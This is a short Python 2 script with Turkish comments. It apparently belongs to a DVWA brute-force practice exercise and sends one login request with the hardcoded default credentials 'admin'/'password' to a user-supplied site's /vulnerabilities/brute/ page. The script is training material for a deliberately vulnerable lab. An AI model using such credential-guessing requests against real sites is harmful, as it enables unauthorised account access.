import sys
import requests

username = 'admin'
password = 'password'
url = raw_input('Web sitesi adresini giriniz: ')

cookies = {'security' : 'high'}

with requests.session() as sess:
   # Login safyasini aliyoruz
   sess.get(url)

   req = sess.get('http://' + url + '/vulnerabilities/brute/?username=' + username + '&password=' + password + '&Login=Login', cookies=cookies)
   print req.text
   
